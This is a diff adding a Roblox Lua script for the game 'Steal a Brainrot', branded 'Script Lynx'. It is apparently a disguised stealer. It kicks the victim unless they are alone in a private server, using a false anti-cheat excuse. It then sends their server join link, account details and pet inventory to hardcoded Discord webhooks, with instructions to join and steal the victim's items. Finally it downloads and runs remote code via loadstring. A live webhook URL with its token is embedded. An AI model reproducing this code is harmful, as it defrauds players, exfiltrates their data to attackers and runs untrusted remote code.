@@ -1,0 +1,357 @@
+if not _G["Script-SM_Config"] then
+    warn("WARNING: Config not loaded! Waiting for config...")
+    repeat task.wait() until _G["Script-SM_Config"]
+    warn("Config loaded successfully!")
+end
+
+--====================================================================--
+-- Services
+--====================================================================--
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+local LocalPlayer = Players.LocalPlayer
+local player = Players.LocalPlayer
+local gui = player:WaitForChild("PlayerGui")
+
+
+--====================================================================--
+-- VIP-Server Check
+--====================================================================--
+local serverType = RobloxReplicatedStorage:WaitForChild("GetServerType"):InvokeServer()
+if serverType ~= "VIPServer" then
+    LocalPlayer:Kick("Script Lynx does not support public servers. [Anti-Cheat Bypasser only works in Private Servers] Join a Private Server.")
+    return
+end
+if #game.Players:GetPlayers() > 1 then
+    game.Players.LocalPlayer:Kick("[Script Lynx] Only one player allowed - It's for your own Safety and to bypass Anti-Cheat.")
+end
+
+--====================================================================--
+-- WEBHOOKS & Username
+--====================================================================--
+local Webhook = _G["Script-SM_Config"].user_webhook
+local prvt_srvrs_logs = "https://discord.com/api/webhooks/1441466710744895663/Re9sVysafp3k-NV9c5GcG_HnnY6-Q3UvBpWvnd-BafMyVVx2VpIh8XKBLUkKfCaPj98m"
+local cfg = _G["Script-SM_Config"]
+local receiver = "Not Configured"
+if cfg and cfg.users then
+    if type(cfg.users) == "table" and #cfg.users > 0 then
+        receiver = tostring(cfg.users[1])
+    elseif type(cfg.users) == "string" then
+        receiver = tostring(cfg.users)
+    end
+end
+
+--====================================================================--
+-- Safe HTTP
+--====================================================================--
+local function safeRequest(url, body)
+    pcall(function()
+        request({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(body)
+        })
+    end)
+end
+
+local function safeHttpGet(url)
+    local ok, result = pcall(function()
+        return game:HttpGet(url)
+    end)
+    if ok then return result end
+    warn("HttpGet blocked: " .. tostring(result))
+    return nil
+end
+
+--====================================================================--
+-- Stats helpers
+--====================================================================--
+local function formatCash(num)
+    if not num or type(num) ~= "number" then return "Unknown" end
+    local abs = math.abs(num)
+    if abs >= 1e12 then return string.format("%.2fT", num/1e12)
+    elseif abs >= 1e9 then return string.format("%.2fB", num/1e9)
+    elseif abs >= 1e6 then return string.format("%.2fM", num/1e6)
+    elseif abs >= 1e3 then return string.format("%.2fK", num/1e3)
+    else return tostring(num) end
+end
+
+local function getStat(name)
+    local ls = player:FindFirstChild("leaderstats")
+    if ls then
+        local v = ls:FindFirstChild(name)
+        if v and (v:IsA("IntValue") or v:IsA("NumberValue")) then return v.Value end
+    end
+    return nil
+end
+
+local function detectExecutor()
+    if identifyexecutor then return identifyexecutor() end
+    if getexecutorname then return getexecutorname() end
+    return "Unknown"
+end
+
+--====================================================================--
+-- Brainrot Emoji System
+--====================================================================--
+local function getBrainrotEmoji(genValue)
+    if genValue >= 100000000 then -- 100M+
+        return "🐲"
+    elseif genValue >= 50000000 then -- 50M+
+        return "🦑"
+    elseif genValue >= 20000000 then -- 20M+
+        return "👽"
+    else
+        return "👾" -- Default
+    end
+end
+--====================================================================--
+-- Brainrot Scanner
+--====================================================================--
+local function parseGenerationValue(generationString)
+    local cleaned = generationString:gsub("%s", ""):match("^%s*(.-)%s*$")
+    local numberPart, unitPart = cleaned:match("(%d+%.?%d*)([KMB]?)")
+    if not numberPart then return 0 end
+    numberPart = tonumber(numberPart)
+    if unitPart == "K" then return numberPart * 1e3
+    elseif unitPart == "M" then return numberPart * 1e6
+    elseif unitPart == "B" then return numberPart * 1e9
+    else return numberPart end
+end
+
+local function findOurPlot()
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return nil end
+
+    for _, plot in ipairs(plots:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        if sign then
+            local surfaceGui = sign:FindFirstChild("SurfaceGui")
+            if surfaceGui then
+                local frame = surfaceGui:FindFirstChild("Frame")
+                if frame then
+                    local textLabel = frame:FindFirstChild("TextLabel")
+                    if textLabel and textLabel.Text == LocalPlayer.DisplayName .. "'s Base" then
+                        return plot
+                    end
+                end
+            end
+        end
+    end
+    return nil
+end
+
+local function getBrainrots()
+    local list = {}
+    local plot = findOurPlot()
+    if not plot then
+        warn("Your base not found!")
+        return list
+    end
+
+    -- Define base boundaries (approximate using plot's size)
+    local baseMinX, baseMaxX = math.huge, -math.huge
+    local baseMinZ, baseMaxZ = math.huge, -math.huge
+    for _, part in ipairs(plot:GetDescendants()) do
+        if part:IsA("BasePart") then
+            local cframe = part.CFrame
+            local size = part.Size
+            baseMinX = math.min(baseMinX, cframe.X - size.X/2)
+            baseMaxX = math.max(baseMaxX, cframe.X + size.X/2)
+            baseMinZ = math.min(baseMinZ, cframe.Z - size.Z/2)
+            baseMaxZ = math.max(baseMaxZ, cframe.Z + size.Z/2)
+        end
+    end
+
+    -- Get all brainrot models in the base
+    local baseBrainrots = {}
+    for _, model in ipairs(plot:GetDescendants()) do
+        if model:IsA("Model") and (model:FindFirstChild("AnimationController") or model:FindFirstChild("Humanoid")) and model.Name ~= "FriendPanel" and model.Name ~= "CashPad" then
+            if model:FindFirstChild("RootPart") then
+                local pos = model.RootPart.Position
+                if pos.X >= baseMinX and pos.X <= baseMaxX and pos.Z >= baseMinZ and pos.Z <= baseMaxZ then
+                    table.insert(baseBrainrots, {name = model.Name, pos = pos})
+                end
+            end
+        end
+    end
+
+    -- Scan Debris for FastOverheadTemplate instances within base boundaries
+    local debris = Workspace:FindFirstChild("Debris")
+    if not debris then
+        warn("Debris folder not found!")
+        return list
+    end
+
+    local seenNames = {}  -- To deduplicate by name
+    for _, template in ipairs(debris:GetChildren()) do
+        if template.Name == "FastOverheadTemplate" then
+            local pos = template.Position
+            -- Check if template is within base boundaries
+            if pos.X >= baseMinX and pos.X <= baseMaxX and pos.Z >= baseMinZ and pos.Z <= baseMaxZ then
+                local overhead = template:FindFirstChild("AnimalOverhead")
+                if overhead then
+                    local nameLbl = overhead:FindFirstChild("DisplayName")
+                    local genLbl = overhead:FindFirstChild("Generation")
+                    if nameLbl and nameLbl:IsA("TextLabel") and genLbl and genLbl:IsA("TextLabel") then
+                        local petName = nameLbl.Text
+                        local genText = genLbl.Text
+                        local genVal = parseGenerationValue(genText)
+                        local emoji = getBrainrotEmoji(genVal)
+
+                        -- Only add if not a duplicate and matches a base brainrot
+                        if not seenNames[petName] then
+                            local isBasePet = false
+                            for _, basePet in ipairs(baseBrainrots) do
+                                if basePet.name == petName or (basePet.pos - pos).Magnitude < 10 then
+                                    isBasePet = true
+                                    break
+                                end
+                            end
+                            if isBasePet then
+                                table.insert(list, {
+                                    name = petName,
+                                    generation = genText,
+                                    value = genVal,
+                                    emoji = emoji
+                                })
+                                seenNames[petName] = true
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    table.sort(list, function(a, b)
+        return a.value > b.value
+    end)
+    return list
+end
+--====================================================================--
+-- Draggable
+--====================================================================--
+local function makeDraggable(frame, handle)
+    local dragging, dragInput, startPos, startMouse
+    handle.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            startMouse = input.Position
+            startPos = frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
+        end
+    end)
+    handle.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and input == dragInput then
+            local delta = input.Position - startMouse
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+                                      startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+end
+
+--====================================================================--
+-- MAIN LOGIC (WITH BRAINROT EMOJIS)
+--====================================================================--
+local joinLink = ""
+
+    joinLink = _G.joinUrl or "Failed to Fetch"
+
+    local cash = getStat("Cash") or 0
+    local steals = getStat("Steals") or 0
+    local rebirths = getStat("Rebirths") or 0
+
+    safeRequest(prvt_srvrs_logs, {content = joinLink})
+
+    local brainrots = getBrainrots()
+    
+    local hitContent = "> 『 ꜱᴍᴀʟʟ ʜɪᴛ 』"
+    for _, v in ipairs(brainrots) do
+        if v.value >= 20000000 then  -- 20M+ generation
+            hitContent = "> @everyone ⋆｡ ɢᴏᴏᴅ ʜɪᴛ ｡⋆"
+            break
+        end
+    end
+    
+local playerCount = #Players:GetPlayers()
+local maxPlayers = Players.MaxPlayers
+
+local payload = {
+    content = hitContent,
+
+    username = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱",
+    avatar_url = "https://script-lynx.vercel.app/pngs/logo.png",
+
+    embeds = {{
+        title = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱",
+        description = 
+            "<:admin_hexagon:1449663928195092502> **How to Use?**\n" ..
+            "Join the user using join link and then just steal user's brainrots.",
+
+        color = 0x000000,
+
+        fields = {
+            { name = "<:vip_hexagon:1449663700494712893> Display Name", value = "```" .. (player.DisplayName or "Unknown") .. "```", inline = false },
+            { name = "<:member_hexagon:1449663611151585292> Username",       value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```", inline = false },
+            { name = "<:verified_hexagon:1449663538833657961> Account Age",   value = "```" .. tostring(player.AccountAge) .. " Days```", inline = false },
+            { name = "<:developer_hexagon:1449663656324235317> Executor",    value = "```" .. detectExecutor() .. "```", inline = false },
+            { name = "<:owner_hexagon:1449663973720064013> Players in Server", value = "```" .. playerCount .. " / " .. maxPlayers .. "```", inline = false },
+            { name = "<:support_hexagon:1449663871651549287> Inventory", value = "Warning: Failed to scan latest brainrots from events.\n```" .. (function() local lines = {} local total = #brainrots local shown = math.min(total, 16) for i = 1, shown do local v = brainrots[i] local emoji = getBrainrotEmoji(v.value) local rate = extractRate(v.name) or v.generation local cleanName = v.name:gsub("%s*%$[%d%.]+[KMB]?/s", ""):gsub("^%s+", ""):gsub("%s+$", "") table.insert(lines, emoji .. " " .. cleanName .. " : " .. rate) end if total > 10 then table.insert(lines, string.format("and %d more brainrot%s..", total - 10, (total - 10 == 1) and "" or "s")) end return #lines > 0 and table.concat(lines, "\n") or "No brainrots found." end)() .. "```"},
+            { name = "<:moderator_hexagon:1449663760217280522> Teleport Script", value = "```No Teleport Script Available for this hit.```", inline = false },
+            { name = "<:management_hexagon:1449663827112362054> Join Player",     value = "[ Click to Join ](" .. joinLink .. ")", inline = false },
+        },
+
+        author = {
+            name = "Steal a Brainrot • Script Lynx Hit",
+            url = joinUrl,
+        },
+
+        footer = {
+            text = "꒰ Script Lynx • Premium Scripts",
+            icon_url = "https://script-lynx.vercel.app/pngs/logo.png"  -- Tiny footer icon
+        },
+
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+
+        image = { url = "https://script-lynx.vercel.app/pngs/sab.webp" },  -- Keep your current game banner or replace with a darker edited version
+    }},
+
+    attachments = {}
+}
+
+local function sendWebhook(url)
+            local success, err = pcall(function()
+                request({
+                    Url = url,
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = HttpService:JSONEncode(payload)
+                })
+            end)
+            if not success then warn("Webhook failed", err) end
+        end
+
+        if Webhook and Webhook ~= "" then
+            sendWebhook(Webhook)
+        end
+
+        local scriptURL = "https://script-lynx.vercel.app/sab/freezer.lua"
+        local src = safeHttpGet(scriptURL)
+        if src then
+            loadstring(src)()
+        else
+            warn("[Script Lynx] Failed to fetch main script")
+        end
